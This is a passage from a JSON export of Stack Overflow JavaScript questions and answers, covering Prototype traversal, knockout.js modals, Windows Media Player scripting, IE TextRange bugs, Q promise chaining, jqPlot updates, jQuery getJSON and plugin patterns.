                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<p>Prototype provides a whole bunch of ways to do this:</p>\n\n<pre><code>// This, from Bill's answer, is probably the fastest, since it uses the \n// Browser's optimized selector engine to get straight to the element\n$$('#example input[type=hidden]').first();\n\n// This isn't bad either. You still use the browser's selector engine \n// To get straight to the #example element, then you must traverse a \n// (small) DOM tree.\n// \n// element.down(selector) selects the first node matching the selector which \n// is an decendent of element\n$('example').down('input');\n\n// Here, you'll get an array containing all the inputs under 'example'. In your HTML\n// there is only one. \n$('example').select('input')\n\n// You can also use element.select() to combine separate groups of elements,\n// For instance, if you needed all the form elements:\n$('example').select('input', 'textarea', 'select');\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 24
                },
                {
                    "body": "<p>I prefer the direct approach</p>\n\n<pre><code>document.forms[0].fieldName.value\n</code></pre>\n\n<p>Which is less code, no need to use jQuery and is more friendly to code design.</p>\n",
                    "is_accepted": false,
                    "score": -1
                }
            ],
            "body": "<p>Given the following markup.</p>\n\n<pre><code>&lt;div id=\"example\"&gt;\n  &lt;div&gt;\n    &lt;div&gt;\n      &lt;input type='hidden'&gt;&lt;/input&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>How can I quickly get the hidden input element given I have the ID for the top most div element with the ID 'example'?  </p>\n\n<p>I can hack away at it so I can just iterate through each child element until I hit the input, however, I'd like to improve on that and utilize Prototype and simply jump to that hidden input given the div.</p>\n\n<p>Thanks!</p>\n",
            "last_activity_date": 1378432663,
            "question_id": 1278281,
            "score": 8,
            "tags": [
                "javascript",
                "prototypejs"
            ],
            "title": "Traversing to a specific child element with Prototype"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p><a href=\"http://www.google.com/friendconnect/home/overview\" rel=\"nofollow\">Google Friend Connect</a> is actually more than what you asked for. It supports other protocols than just OpenID but it supports OpenID too. The widget is pretty easy to use.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Google have a project called <a href=\"https://developers.google.com/identity-toolkit/\" rel=\"nofollow\">Google Identity Toolkit</a> (GITkit) which seems to make OpenID stuff pretty easy. They have their own client library implementation to go with the API service it appears.</p>\n\n<p>This is apparently part of a wider <a href=\"http://accountchooser.com/index.html\" rel=\"nofollow\">Account Chooser</a> project, which also points to a Janrain implementation called <a href=\"http://janrain.com/products/login-helper/\" rel=\"nofollow\">Login Helper</a>, but that seems to be a case of contacting them directly to discuss usage.</p>\n\n<p>Janrain also has an <a href=\"http://janrain.com/products/engage/pricing/\" rel=\"nofollow\">Engage</a> product, which is free up to 2,500 users at the time of writing (April '12). It seems to support many more providers than the Google implementation, although Google say they will be adding more in future.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I need an OpenID login widget like the one on Stackoverflow or <a href=\"https://www.idselector.com/user/login\">Id Selector</a> (which has been discontinued in favor of RPXnow which is a commercial service). </p>\n\n<p>What is the best way to make these? Is there a framework or example implementation anywhere?</p>\n",
            "last_activity_date": 1369683909,
            "question_id": 1162513,
            "score": 8,
            "tags": [
                "javascript",
                "html",
                "openid",
                "widget"
            ],
            "title": "Creating an OpenID login widget"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>I would create another observable that wraps the employee.</p>\n\n<pre><code>this.detailedEmployee = ko.observable({}),\n\nvar self = this;\nthis.showDetails = function(employee){\n    self.detailedEmployee(employee);\n    $(\"#dialog\").dialog(\"show\"); //or however your dialog works\n}\n</code></pre>\n\n<p>Attach the click to <code>showDetails</code>. Then you can just call <code>applyBindings</code> on page load.</p>\n",
                    "is_accepted": true,
                    "score": 0
                },
                {
                    "body": "<p>I would like to propose a different way to work with modals in MVVVM. In MVVM, the ViewModel is data for the View, and the View is responsible for the UI. If we examine this proposal:</p>\n\n<pre><code>this.detailedEmployee = ko.observable({}),\n\nvar self = this;\nthis.showDetails = function(employee){\n    self.detailedEmployee(employee);\n    $(\"#dialog\").dialog(\"show\"); //or however your dialog works\n}\n</code></pre>\n\n<p>I strongly agree with <code>this.detailedEmployee = ko.observable({})</code>, but I am in strong disagreement with this line: <code>$(\"#dialog\").dialog(\"show\");</code>. This code is placed in the ViewModel and shows the modal window, wherein fact it is View's responsibility, so we screw-up the MVVM approach. I would say this piece of code will solve your current task but it could cause lots of problems in future.</p>\n\n<ul>\n<li>When closing the popup, you should set <code>detailedEmployee</code> to <code>undefined</code> to have your main ViewModel in a consistent state.</li>\n<li>When closing the popup, you might want to have validation and the possibility to discard the close operation when you want to use another modal's component in the application</li>\n</ul>\n\n<p>As for me, these points are very critical, so I would like to propose a different way. If we \"forget\" that you need to display data in popup, binding <code>with</code> could solve your issue.</p>\n\n<pre><code>this.detailedEmployee = ko.observable(undefined);\nvar self = this;\nthis.showDetails = function(employee){\n    self.detailedEmployee(employee);\n}\n\n&lt;div data-bind=\"with: detailedEmployee\"&gt;\nData to show\n&lt;/div&gt;\n</code></pre>\n\n<p>As you can see, your ViewModel don't know anything about <em>how</em> data should be shown. It knows only about <em>data</em> that should be shown. The <code>with</code> binding will display content only when <code>detailedEmployee</code> is defined. Next, we should find a binding similar to <code>with</code> but one that will display content in the popup. Let's give it the name <code>modal</code>. Its code is like this:</p>\n\n<pre><code>ko.bindingHandlers['modal'] = {\n    init: function(element) {\n        $(element).modal('init');\n        return ko.bindingHandlers['with'].init.apply(this, arguments);\n    },\n    update: function(element, valueAccessor) {\n        var value = ko.utils.unwrapObservable(valueAccessor());\n        var returnValue = ko.bindingHandlers['with'].update.apply(this, arguments);\n\n        if (value) {\n            $(element).modal('show');\n        } else {\n            $(element).modal('hide');\n        }\n\n        return returnValue;\n    }\n};\n</code></pre>\n\n<p>As you can see, it uses the <code>with</code> plugin internally, and shows or hide a popup depending on value passed to binding. If it is defined - 'show'. If not - 'hide'. Its usage will be the as with:</p>\n\n<pre><code>&lt;div data-bind=\"modal: detailedEmployee\"&gt;\n    Data to show\n&lt;/div&gt;\n</code></pre>\n\n<p>The only thing you need to do is to use your favorite modals plugin. I prepared an example with the Twitter Bootstrap popup component: <a href=\"http://jsfiddle.net/euvNr/embedded/result/\" rel=\"nofollow\">http://jsfiddle.net/euvNr/embedded/result/</a></p>\n\n<p>In this example, custom binding is a bit more powerful; you could subscribe the onBeforeClose event and cancel this event if needed. Hope this helps.</p>\n",
                    "is_accepted": false,
                    "score": 32
                }
            ],
            "body": "<p>I am using knockout.js to display a list of employees.  I have a single hidden modal markup on the page.  When the \"details\" button for a single employees is clicked, I want to data-bind that employee to the modal popup.  I am using the ko.applyBindings(employee, element) but the problem is when the page loads, it is expecting the modal to start off as bound to something.  </p>\n\n<p>So I'm wondering, is there a trick/strategy to do a late/deferred databinding? I looked into virtual bindings but the documentation was not helpful enough.</p>\n\n<p>Thanks!</p>\n",
            "last_activity_date": 1413464547,
            "question_id": 10626780,
            "score": 7,
            "tags": [
                "javascript",
                "dialog",
                "knockout.js",
                "modal-dialog",
                "late-binding"
            ],
            "title": "knockout.js - deferred databinding for modal?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>Windows media player is exposed as an activex control that any scripting language running in the windows script host should be able to access. You should be able to use jscript to control it. Jscript is microsofts implimentation of java script. For information on what objects and methods are availble using jscript for windows media player se <a href=\"http://msdn.microsoft.com/en-us/library/bb249259(VS.85).aspx\" rel=\"nofollow\">this link.</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>There is no open JavaScript library as far as I know for crossbrowser clientside handling of a WMP player.\nHowever, <a href=\"http://dotupdate.wordpress.com/2007/08/15/using-wmp-and-quicktime-with-silverlight/\" rel=\"nofollow\">this link</a> should make it quite easy for you to start your own little library. The code might need some updating and testing in modern browser versions but you have the basics there.</p>\n\n<p>The library your searching for would be a great idea for a Google Code project, I guess that while everyone today is using Adobe Flash with <a href=\"http://wiki.novemberborn.net/sifr3\" rel=\"nofollow\">sIFR</a> / <a href=\"http://code.google.com/p/swfobject/\" rel=\"nofollow\">swfobject</a> or Microsoft Silverligt with <a href=\"http://fortes.com/projects/silverlight/sistr/\" rel=\"nofollow\">sistr</a> etc, there are not much interest to write clientside script controlling for WMP.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><a href=\"http://www.schillmania.com/projects/soundmanager2/\" rel=\"nofollow\">http://www.schillmania.com/projects/soundmanager2/</a> allows you to access play, pause, etc but it is flash based.</p>\n\n<p>Eric</p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>There is an API in Microsoft's developer center, but it will only work if you embed windows media player using active-x.</p>\n\n<p>To \"learn\" more about the API, check out MSDN: <a href=\"http://msdn.microsoft.com/en-us/library/dd564034%28VS.85%29.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/dd564034(VS.85).aspx</a></p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>The API requires ActiveX connectivity native to Internet Explorer, or can use a <a href=\"http://port25.technet.com/pages/windows-media-player-firefox-plugin-download.aspx\">plugin for Firefox</a>.</p>\n\n<p>Here's a sample page that might get you started.</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;so-wmp&lt;/title&gt;\n  &lt;script&gt;\n\n    onload=function() {\n      player = document.getElementById(\"wmp\");\n      player.URL = \"test.mp3\";\n    };\n\n    function add(text) {\n      document.body\n        .appendChild(document.createElement(\"div\"))\n        .appendChild(document.createTextNode(text));\n    };\n\n    function handler(type) {\n      var a = arguments;\n      add(type +\" = \"+ PlayStates[a[1]]);\n    };\n\n    // http://msdn.microsoft.com/en-us/library/bb249361(VS.85).aspx\n    var PlayStates = {\n       0: \"Undefined\", // Windows Media Player is in an undefined state.\n       1: \"Stopped\", // Playback of the current media item is stopped.\n       2: \"Paused\", // Playback of the current media item is paused. When a media item is paused, resuming playback begins from the same location.\n       3: \"Playing\", // The current media item is playing.\n       4: \"ScanForward\", // The current media item is fast forwarding.\n       5: \"ScanReverse\", // The current media item is fast rewinding.\n       6: \"Buffering\", // The current media item is getting additional data from the server.\n       7: \"Waiting\", // Connection is established, but the server is not sending data. Waiting for session to begin.\n       8: \"MediaEnded\", // Media item has completed playback.\n       9: \"Transitioning\", // Preparing new media item.\n      10: \"Ready\", // Ready to begin playing.\n      11: \"Reconnecting\" // Reconnecting to stream.\n    };\n\n  &lt;/script&gt;\n  &lt;script for=\"wmp\" event=\"PlayStateChange(newState)\"&gt;\n    // http://msdn.microsoft.com/en-us/library/bb249362(VS.85).aspx\n    handler.call(this, \"playstatechange\", newState);\n  &lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;div id=\"page\"&gt;\n    &lt;object id=\"wmp\"\n       classid=\"clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6\"\n          type=\"application/x-oleobject\"&gt;\n    &lt;/object&gt;\n  &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 11
                },
                {
                    "body": "<p>Should use next WMP object (works in Chrome, FF, Safari)</p>\n\n<pre><code>    objPlayer = document.getElementById(\"wmp\");           \n    objPlayer.controls.stop();\n    objPlayer.URL = this.url;\n    objPlayer.controls.play();\n\n&lt;EMBED id=\"wmp\" TYPE=\"application/x-mplayer2\" name=\"MediaPlayer\" width=\"0\" height=\"0\" ShowControls=\"0\" ShowStatusBar=\"0\" ShowDisplay=\"0\" autostart=\"0\"&gt;&lt;/EMBED&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I want to use JavaScript to control an embedded Windows Media Player, as well as access any properties that the player exposes. I've found a few hacky examples online, but nothing concrete. </p>\n\n<p>I really need access to play, pause, stop, seek, fullscreen, etc. I'd also like to have access to any events the player happens to broadcast. </p>\n\n<p>Help would be wonderful (I already have a Flash equiv, just so you know), thanks! </p>\n",
            "last_activity_date": 1358400398,
            "question_id": 299582,
            "score": 7,
            "tags": [
                "javascript",
                "windows-media-player"
            ],
            "title": "Is there a documented JavaScript API for Windows Media Player?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I recently worked at a site which used Microsoft CMS with the \"MSIB+ pack\" of controls which included a WYSIWYG editor which ran in Internet Explorer.</p>\n\n<p>I seem to remember some comments in the editor client-side Javascript which were specifically related to this bug in IE and the Range.Select() method.</p>\n\n<p>Unfortunately, I'm not working there anymore so I can't access the Javascript files, but perhaps you may be able to get them from elsewhere?</p>\n\n<p>Good luck</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I've had a bit of a dig &amp; unfortunately can't see a workaround... Although one thing I noticed while debugging the javascript, it seems like the problem is actually with the range object itself rather than with the subsequent <code>range.select()</code>. If you look at the values on the range object that <code>selection.createRange()</code> returns, yes the parent dom object may be correct, but the positioning info is already referring to the start of the next line (i.e. offsetLeft/Top, boundingLeft/Top, etc are already wrong).</p>\n\n<p>Based on the info <a href=\"http://www.quirksmode.org/dom/range%5Fintro.html\" rel=\"nofollow\">here</a>, <a href=\"http://www.quirksmode.org/dom/w3c%5Frange.html\" rel=\"nofollow\">here</a> and <a href=\"http://msdn.microsoft.com/en-us/library/ms535872%28VS.85%29.aspx\" rel=\"nofollow\">here</a>, I think you're out of luck with IE, since you only have access to Microsoft's TextRange object, which appears to be broken. From my experimentation, you can move the range around and position it exactly where it should be, but once you do so, the range object automatically shifts down to the next line even before you've tried to <code>.select()</code> it. For example, you can see the problem by putting this code in between your Step 1 &amp; Step 2:</p>\n\n<pre><code>if (range.boundingWidth == 0)\n{\n    //looks like its already at the start of the next line down...\n    alert('default position: ' + range.offsetLeft + ', ' + range.offsetTop);\n    //lets move the start of the range one character back\n    //(i.e. select the last char on the line)\n    range.moveStart(\"character\", -1);\n    //now the range looks good (except that its width will be one char);\n    alert('one char back: ' + range.offsetLeft + ', ' + range.offsetTop);\n    //calculate the true end of the line...\n    var left = range.offsetLeft + range.boundingWidth;\n    var top = range.offsetTop;\n    //now we can collapse back down to 0 width range\n    range.collapse();\n    //the position looks right\n    alert('moving to: ' + left + ', ' + top);\n    //move there.\n    range.moveToPoint(left, top);\n    //oops... on the next line again... stupid IE.\n    alert('moved to: ' + range.offsetLeft + ', ' + range.offsetTop);\n}\n</code></pre>\n\n<p>So, unfortunately it doesn't look like there's any way to ensure that the range is in the right spot when you select it again.</p>\n\n<p>Obviously there's the trivial fix to your code above, by changing Step 2 it to this:</p>\n\n<pre><code>// Step 2 Restore the selection\nif (range.select) {\n    if (range.boundingWidth &gt; 0) {\n        range.select();\n    }\n} else {\n    selection.removeAllRanges();\n    selection.addRange(range);\n    doc.body.focus();\n}\n</code></pre>\n\n<p>But presumably, you actually want to do something between Step 1 &amp; Step 2 in your actual which involves moving the selection, hence the need to re-set it. But just in case. :)</p>\n\n<p>So, the best I can do is go &amp; vote for the bug you created... Hopefully they'll fix it.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I've figured out a few methods for dealing with IE ranges like this.</p>\n\n<p>If all you want to do is save where the cursor is, and then restore it, you can use the pasteHTML method to insert an empty span at the current position of the cursor, and then use the moveToElementText method to put it back at that position again:</p>\n\n<pre><code>// Save position of cursor\nrange.pasteHTML('&lt;span id=\"caret\"&gt;&lt;/span&gt;')\n\n...\n\n// Create new cursor and put it in the old position\nvar caretSpan = iframe.contentWindow.document.getElementById(\"caret\");\nvar selection = iframe.contentWindow.document.selection;\nnewRange = selection.createRange();\nnewRange.moveToElementText(caretSpan);\n</code></pre>\n\n<p>Alternatively, you can count how many characters precede the current cursor position and save that number:</p>\n\n<pre><code>var selection = iframe.contentWindow.document.selection;\nvar range = selection.createRange().duplicate();\nrange.moveStart('sentence', -1000000);\nvar cursorPosition = range.text.length;\n</code></pre>\n\n<p>To restore the cursor, you set it to the beginning and then move it that number of characters:</p>\n\n<pre><code>var newRange = selection.createRange();\nnewRange.move('sentence', -1000000);\nnewRange.move('character', cursorPosition);\n</code></pre>\n\n<p>Hope this helps.</p>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>Maybe I misunderstand, but if I click to the right of that first line, my cursor already immediately appears at the start of the second line, so that's not a TextRange issue, right?</p>\n\n<p>Adding a doctype so the test page is rendered in standards mode instead of quirks mode fixes that for me.</p>\n\n<p>And I can't reproduce what your myhandler function does, because clicking that button moves the focus away to the button so I can no longer see the cursor and can't get it back either. Finding the cursor position in a <em>contentEditable</em> area <a href=\"http://www.google.com/search?q=ie%2Bcursor%2Bposition%2Bcontenteditable\" rel=\"nofollow\">seems to be a different problem altogether</a>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm having an unusual problem with an IE document with contentEditable set to true.  Calling select() on a range that is positioned at the end of a text node that immediately precedes a block element causes the selection to be shifted to the right one character and appear where it shouldn't.  I've submitted a bug to Microsoft against IE8.  If you can, please vote for this issue so that it can be fixed.</p>\n\n<p><a href=\"https://connect.microsoft.com/IE/feedback/ViewFeedback.aspx?FeedbackID=390995\" rel=\"nofollow\">https://connect.microsoft.com/IE/feedback/ViewFeedback.aspx?FeedbackID=390995</a></p>\n\n<p>I've written a test case to demonstrate the effect:</p>\n\n<pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;iframe id=\"editable\"&gt;\n      &lt;html&gt;\n        &lt;body&gt;\n          &lt;div id=\"test\"&gt;\n            Click to the right of this line -&amp;gt;\n            &lt;p id=\"par\"&gt;Block Element&lt;/p&gt;\n          &lt;/div&gt;\n        &lt;/body&gt;\n      &lt;/html&gt;\n    &lt;/iframe&gt;\n    &lt;input id=\"mytrigger\" type=\"button\" value=\"Then Click here to Save and Restore\" /&gt;\n    &lt;script type=\"text/javascript\"&gt;\n        window.onload = function() {\n            var iframe = document.getElementById('editable');\n            var doc = iframe.contentDocument || iframe.contentWindow.document;\n\n            // An IFRAME without a source points to a blank document.  Here we'll\n            // copy the content we stored in between the IFRAME tags into that\n            // document.  It's a hack to allow us to use only one HTML file for this\n            // test.\n            doc.body.innerHTML = iframe.textContent || iframe.innerHTML;\n\n            // Marke the IFRAME as an editable document\n            if (doc.body.contentEditable) {\n                doc.body.contentEditable = true;\n            } else {\n                var mydoc = doc;\n                doc.designMode = 'On';\n            }\n\n            // A function to demonstrate the bug.\n            var myhandler = function() {\n                // Step 1 Get the current selection\n                var selection = doc.selection || iframe.contentWindow.getSelection();\n                var range = selection.createRange ? selection.createRange() : selection.getRangeAt(0);\n\n                // Step 2 Restore the selection\n                if (range.select) {\n                    range.select();\n                } else {\n                    selection.removeAllRanges();\n                    selection.addRange(range);\n                    doc.body.focus();\n                }\n            }\n\n            // Set up the button to perform the test code.\n            var button = document.getElementById('mytrigger');\n            if (button.addEventListener) {\n                button.addEventListener('click', myhandler, false);\n            } else {\n                button.attachEvent('onclick', myhandler);\n            }\n          }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>The problem is exposed in the myhandler function. This is all that I'm doing, there is no Step 3 in between the saving and restoring the selection, and yet the cursor moves.  It doesn't seem to happen unless the selection is empty (ie. I have a blinking cursor, but no text), and it only seems to happen whenever the cursor is at the end of a text node that immediately precedes a block node.</p>\n\n<p>It seems that the range is still in the correct position (if I call parentElement on the range it returns the div), but if I get a new range from the current selection, the new range is inside the paragraph tag, and that is its parentElement.</p>\n\n<p><strong>How do I work around this and consistently save and restore the selection in internet explorer?</strong></p>\n",
            "last_activity_date": 1254699615,
            "question_id": 130186,
            "score": 7,
            "tags": [
                "javascript",
                "internet-explorer"
            ],
            "title": "IE TextRange select method not working properly"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You probably doesn't need to wait until modelA is created to create modelB and so on.<br>\nIf this is true, then you can do the following:</p>\n\n<pre><code>var promises = [\n  ModelA.create(...),\n  ModelB.create(...),\n  ModelC.create(...)\n);\n\nQ.all( promises ).spread(function( modelA, modelB, modelC ) {\n  // Do things with them!\n}).fail(function() {\n  // Oh noes :(\n});\n</code></pre>\n\n<p>What this does is:</p>\n\n<ul>\n<li>Create an array of promises, with one promise for each model you need;</li>\n<li>Execute all 3 promises in parallel;</li>\n<li>Execute a function passed in <code>spread()</code> when all 3 promises are done. The arguments are the resolved values for each promise, in the declaration order.</li>\n</ul>\n\n<p>I hope it helps you :)</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>These are some of your many options:</p>\n\n<p>Behind door 1, use reduce to accumulate the results in series.</p>\n\n<pre><code>var models = [];\n[\n    function () {\n        return ModelA.create(/*...*/);\n    },\n    function () {\n        return ModelB.create(/*...*/);\n    },\n    function () {\n        return ModelC.create(/*...*/);\n    }\n].reduce(function (ready, makeModel) {\n    return ready.then(function () {\n        return makeModel().then(function (model) {\n            models.push(model);\n        });\n    });\n}, Q())\n.catch(function (error) {\n    // handle errors\n});\n</code></pre>\n\n<p>Behind door 2, pack the accumulated models into an array, and unpack with spread.</p>\n\n<pre><code>Q.try(function () {\n    return ModelA.create(/* params */)\n})\n.then(function(modelA){\n    return [modelA, ModelB.create(/* params */)];\n})\n.spread(function(modelA, modelB){\n    return [modelA, modelB, ModelC.create(/* params */)];\n})\n.spread(function(modelA, modelB, modelC){\n    // need to do stuff with modelA, modelB and modelC\n})\n.catch(/*do failure stuff*/);\n</code></pre>\n\n<p>Behind door 3, capture the results in the parent scope:</p>\n\n<pre><code>var models [];\nModelA.create(/* params */)\n.then(function(modelA){\n    models.push(modelA);\n    return ModelB.create(/* params */);\n})\n.then(function(modelB){\n    models.push(modelB);\n    return ModelC.create(/* params */);\n})\n.then(function(modelC){\n    models.push(modelC);\n\n    // need to do stuff with models\n\n})\n.catch(function (error) {\n    // handle error\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>The <a href=\"https://github.com/petkaantonov/bluebird\" rel=\"nofollow\">Bluebird</a> promises library provides another solution for this via <code>.bind()</code>.</p>\n\n<p>It looks like this:</p>\n\n<pre><code>ModelA.create(/* params */).bind({})\n.then(function (modelA) {\n    this.modelA = modelA;\n    return ModelB.create(/* params */);\n})\n.then(function (modelB) {\n    this.modelB = modelB;\n    return ModelC.create(/* params */);\n})\n.then(function (modelC) {\n    // you have access to this.modelA, this.modelB and modelC;\n});\n</code></pre>\n\n<p>There is a lot of interesting information about this method in the <a href=\"https://github.com/petkaantonov/bluebird/blob/master/API.md#binddynamic-thisarg---promise\" rel=\"nofollow\">documentation</a>.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>I'm trying to get my head around promises, using the Q module in node.js, however I have a small issue.</p>\n\n<p>In this example:</p>\n\n<pre><code>ModelA.create(/* params */)\n.then(function(modelA){\n    return ModelB.create(/* params */);\n})\n.then(function(modelB){\n    return ModelC.create(/* params */);\n})\n.then(function(modelC){\n\n    // need to do stuff with modelA, modelB and modelC\n\n})\n.fail(/*do failure stuff*/);\n</code></pre>\n\n<p>The .create method returns a promise then in each .then(), as expected one gets the resolved value of the promise.</p>\n\n<p>However in the final .then() I need to have all 3 previously resolved promise values.</p>\n\n<p>What would be the best way to do this?</p>\n",
            "last_activity_date": 1422702104,
            "question_id": 18849312,
            "score": 6,
            "tags": [
                "javascript",
                "node.js",
                "promise"
            ],
            "title": "What is the best way to pass resolved promise values down to a final &quot;then&quot; chain"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>This is the way I found after lots of investigation. I am writing this down to help someone reading this question.</p>\n\n<p>The correct place to update the data is in the series property, after updating the data you can redraw the plot:</p>\n\n<pre><code>targetPlot.series[0].data = myData;\ntargetPlot.redraw();\n</code></pre>\n\n<p>If your axis changed, then you can rescale them by using <code>replot()</code> instead of <code>redraw()</code>:</p>\n\n<pre><code>targetPlot.replot({resetAxes:true});\n</code></pre>\n\n<p>This is much faster than redrawing a new plot every time.</p>\n",
                    "is_accepted": true,
                    "score": 15
                }
            ],
            "body": "<p>I am \"animating\" diagrams over time by changing the data and redrawing them.</p>\n\n<pre><code>// initialization\nvar data = ...\nvar targetPlot = $.jqplot('#diagram', data, diagramOptions);\n</code></pre>\n\n<p>Now after some time I will change the data in some way and want to update the diagram. The following solution works:</p>\n\n<pre><code>// update Data\ntargetPlot.data = ...;\n// remove old diagram\n$('#&lt;%= \"diagram\" + diagram.id.to_s %&gt;container').empty();\n// redraw\ntargetPlot = $.jqplot('#diagram', data, diagramOptions);\n</code></pre>\n\n<p>Bit this is a complete redraw. With lots of data and a short intervall jQPlot takes much memory and the diagram is flickering.</p>\n\n<p>How to do this correct?</p>\n\n<p>The solution using the redraw-function for me only draws the old diagram:</p>\n\n<pre><code>// update Data\ntargetPlot.data = ...;\ntargetPlot.redraw();\n</code></pre>\n",
            "last_activity_date": 1311670976,
            "question_id": 6761088,
            "score": 6,
            "tags": [
                "javascript",
                "jquery",
                "jquery-plugins",
                "diagram",
                "jqplot"
            ],
            "title": "How to animate diagrams with jQuery and jQplot (updating data)"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>It's not working as you are printing the result straight away, remember that the code where you concatenate the result is a callback so will fire after your alert. </p>\n\n<p>On each callback you'll have to check if all have finished. replace the alert() call with your processing. :)</p>\n\n<pre><code>    var result = 0;\n    var doneCount = 0;\n\n    $.each(urls, function (i, url) {\n        $.getJSON(url, function (json) {\n            doneCount++;\n            result += json.field1;\n            if (doneCount == urls.length) {\n                alert(result);\n            }\n        })\n    });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Using jQuery 1.5 deferred objects:</p>\n\n<p>Accumulate an array of the JQXHR objects returned by <code>$.getJSON()</code></p>\n\n<pre><code>var jxhr = [];\nvar result = 0;\n$.each(urls, function (i, url) {\n    jxhr.push(\n        $.getJSON(url, function (json) {\n            result += json.field1;\n        })\n    );\n});\n</code></pre>\n\n<p>and only <code>$.when</code> they're all <code>.done()</code>:</p>\n\n<pre><code>$.when.apply($, jxhr).done(function() {\n    alert(result);\n});\n</code></pre>\n\n<p>NB: this will accumulate <code>result</code> in the order that the AJAX calls complete, not in the order they're made.</p>\n",
                    "is_accepted": true,
                    "score": 23
                }
            ],
            "body": "<p>My script needs to fetch several json files on <a href=\"https://graph.facebook.com/xxxx\">https://graph.facebook.com/xxxx</a>, and retrieve a certain field from each json, then calculate summation.</p>\n\n<p>My problem is how to print out the result after all getJSON done? With below code it will prints 0. Feel free to suggest any better approaches. </p>\n\n<pre><code>var result = 0;\n$.each(urls, function (i, url) {\n    $.getJSON(url, function (json) {\n        result += json.field1;\n    })\n});\nalert(result);\n</code></pre>\n",
            "last_activity_date": 1406402758,
            "question_id": 5817811,
            "score": 6,
            "tags": [
                "javascript",
                "jquery",
                "json"
            ],
            "title": "jQuery Multiple getJSON requests"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>How about using setInterval and an equation called zeno's paradox:</p>\n\n<p><a href=\"http://jsfiddle.net/88526/1/\">http://jsfiddle.net/88526/1/</a></p>\n\n<p>That's the way I usually do it.</p>\n\n<p>As requested, I've included the code in this answer. Given a a div with absolute positioning:</p>\n\n<p>CSS:</p>\n\n<pre><code>#follower{\n  position : absolute;\n  background-color : red;\n  color : white;\n  padding : 10px;\n}\n</code></pre>\n\n<p>HTML:</p>\n\n<pre><code>&lt;div id=\"follower\"&gt;Move your mouse&lt;/div&gt;\n</code></pre>\n\n<p>JS w/jQuery:</p>\n\n<pre><code>var mouseX = 0, mouseY = 0;\n$(document).mousemove(function(e){\n   mouseX = e.pageX;\n   mouseY = e.pageY; \n});\n\n// cache the selector\nvar follower = $(\"#follower\");\nvar xp = 0, yp = 0;\nvar loop = setInterval(function(){\n    // change 12 to alter damping, higher is slower\n    xp += (mouseX - xp) / 12;\n    yp += (mouseY - yp) / 12;\n    follower.css({left:xp, top:yp});\n\n}, 30);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 26
                }
            ],
            "body": "<p>OK, this works perfectly fine for following my mouse.</p>\n\n<pre><code>//\n$(document).mousemove(function(e){\n  $(\"#follower\").css({\n      'top': e.pageY + 'px';\n      'left': e.pageX + 'px';\n  });\n});\n//\n</code></pre>\n\n<p>And this works great for animating the mouse to a clicked point</p>\n\n<pre><code>//\n$(document).click(function(e){\n  $(\"#follower\").animate({\n      top: e.pageY + 'px';\n      left: e.pageX + 'px';\n  }, 800);\n});\n//\n</code></pre>\n\n<p>But I personally feel that logically this SHOULD work! Coming from my point of view as the webscripter. Amd then my question is, how can I make this work. I want the #follower to try and follow my mouse with a dynamic kind of lagging behind feel.</p>\n\n<pre><code>//\n$(document).mousemove(function(e){\n  $(\"#follower\").animate({\n      top: e.pageY + 'px';\n      left: e.pageX + 'px';\n  }, 800);\n});\n//\n</code></pre>\n",
            "last_activity_date": 1301022866,
            "question_id": 4847726,
            "score": 6,
            "tags": [
                "javascript",
                "jquery",
                "mousemove"
            ],
            "title": "how to animate following the mouse in jquery"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>a good starting pattern looks like:</p>\n\n<pre><code>(function($){\n   $.fn.yourplugin = function() {\n   };\n}(jQuery));\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p><a href=\"http://docs.jquery.com/Plugins/Authoring#Summary_and_Best_Practices\" rel=\"nofollow\">Summary and Best Practices while writing a jQuery Plugin</a></p>\n\n<pre><code>(function($){\n  // $('p').greenify() turns all text in p elements green.\n  $.fn.greenify = function() {\n    this.css( \"color\", \"green\" ); // set text color\n    return this; // for chaining;\n  };\n})(jQuery);\n</code></pre>\n",
                    "is_accepted": false,
